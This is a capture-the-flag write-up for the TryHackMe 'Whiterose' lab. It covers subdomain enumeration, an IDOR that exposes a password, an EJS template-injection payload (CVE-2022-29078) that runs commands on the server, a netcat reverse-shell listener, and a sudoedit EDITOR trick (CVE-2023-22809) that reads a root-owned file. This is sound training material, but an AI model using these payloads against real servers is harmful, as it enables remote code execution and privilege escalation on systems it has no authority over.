# thm: Whiterose CVE-2022–29078, CVE-2023-22809

https://tryhackme.com/room/whiterose

## Enumeration

The first step is to perform basic enumeration using Nmap. 

```
$ nmap <target ip> -oN output.txt
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
7103/tcp filtered unknown
```

add domain to /etc/hosts
```
$ sudo nano /etc/hosts
$ cat /etc/hosts
<target ip> cyprusbank.thm
```

to get further lets do subdomain brute force with ffuf.
```
$ ffuf -u http://<target ip>/ -H "Host:FUZZ.cyprusbank.thm" -w ~/Downloads/
www                     [Status: 200, Size: 252, Words: 19, Lines: 9]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1]
```

from ffuf output shows an interesting subdomain called admin. `sudo nano /etc/hosts` again and change `cyprusbank.thm` to `admin.cyprusbank.thm`.

Login with the given credential. `Olivia Cortez:olivi8` 

## Exploitation

After ran a manual review of exposed endpoints and client-side logic, found some interesting endpoint. On `http://admin.cyprusbank.thm/messages/?c=5` the c parameter is vulnerable to **insecure direct object reference (IDOR)**. By changing the parameter to c=10, a message containing Gayle Bev’s password is exposed, resulting in unauthorized disclosure of sensitive credentials.
```
Gayle Bev: Of course! My password is '[REDACTED]'
```

After logging in with the provided credentials, Tyrell Wellick’s phone number was accessible, exposing sensitive personal information.

While intercepting the request with Burp Suite, modifying the password parameter triggered an error that exposed the use of EJS (Embedded JavaScript) templates in the application. 

    http://admin.cyprusbank.thm/settings

Request:
```
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://admin.cyprusbank.thm
Connection: keep-alive
Referer: http://admin.cyprusbank.thm/settings
Cookie: connect.sid=s%3AJOexcjMZ8sf5FRIGKw1hQqE8qcQ_Auti.H9cKb7IHVdDLa6bOzxOfYV9UlEHcVyBC6ounhAxKaXY
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=test&password1=test
```

Responce:
```
HTTP/1.1 500 Internal Server Error
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 15 Sep 2025 08:12:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1665
Connection: keep-alive
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: /home/web/app/views/settings.ejs:14<br>
```
This ReferenceError message is not normal behavior for a production website. Normally, a server should not show internal file paths or stack traces to users. This error message reveals that the server is executing JavaScript.

### What is EJS?

So, let’s take a moment to get deeper into EJS(Embedded JavaScript).

EJS is a server-side template engine for Node.js that generates HTML dynamically by filling placeholders with real data. 

What happens is EJS templates can run JavaScript on the server side and EJS uses <% %> to run code and <%= %> to output values. Normally, this is safe if only the server controls what code runs. But the server uses untrusted input in templates

If the application takes user input (like a query parameter or form field) and inserts it into the template without sanitizing or escaping it, the user can inject their own JavaScript.

Server executes user-provided code because Node.js runs the template on the server, any JavaScript in the input is executed.


It can lead to Server-Side Template Injection (SSTI), allowing attackers to execute arbitrary code on the server. This allows attackers to run commands like `global.process.mainModule.require('child_process').execSync('id')`. This loads Node.js’s child_process module and runs the id command, printing the server’s current user information. When executed, this confirms Remote Code Execution (RCE), demonstrating that the application unsafely evaluates user input in its EJS templates.

The file `/home/web/app/views/settings.ejs` appears to be an EJS template in a Node.js/Express.js application, potentially exposing the application to CVE-2022-29078, a server-side template injection vulnerability that could allow remote code execution.

### CVE-2022-29078: EJS Server Side Template Injection RCE 

https://security.snyk.io/vuln/SNYK-JS-EJS-2803307

SSTI payload: 
```
name=test&password=test&settings[view options][outputFunctionName]=x; return global.process.mainModule.require('child_process').execSync('id');//
```
Responce:
```
uid=1001(web) gid=1001(web) groups=1001(web)
```

Next, visit revshells.com and generated a reverse shell payload. The attacker’s IP address (tun0) and a port number (default) were specified, with the shell type set to nc and the payload encoded using URL encoding.
```
nc -lnvp 5555
Listening on 0.0.0.0 5555
```
Once the payload was sent, a reverse shell connection was established, allowing access to the `user.txt` file.
```
Connection received on [REDACTED]
sh: 0: can't access tty; job control turned off
$ whoami
web
$ pwd
/home/web/app
$ ls
components
index.js
node_modules
package.json
package-lock.json
routes
static
views
$ cd 
$ ls
app
user.txt
$ cat user.txt
THM{[REDACTED]}
```
```
name=dfsdf&settings[view options][outputFunctionName]=x; return global.process.mainModule.require('child_process').execSync('cd ..; cat user.txt');//
```
## Privilege Escalation

### CVE-2023-22809

```
$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
$ sudoedit -V
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```
### Reference
Korean: https://www.skshieldus.com/download/files/download.do?o_fname=EQST%20insight_Research%20Technique_202303.pdf&r_fname=20230310141202990.pdf

English: https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf

Looks like the target's sudoedit version has CVE.
```
$ export EDITOR="vi -- /root/root.txt"
$ echo $EDITOR
vi -- /root/root.txt
$     sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm


THM{[REDACTED]}
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
"/var/tmp/rootZWkIXB0v.txt" 1L, 21C                           1,1           All
```
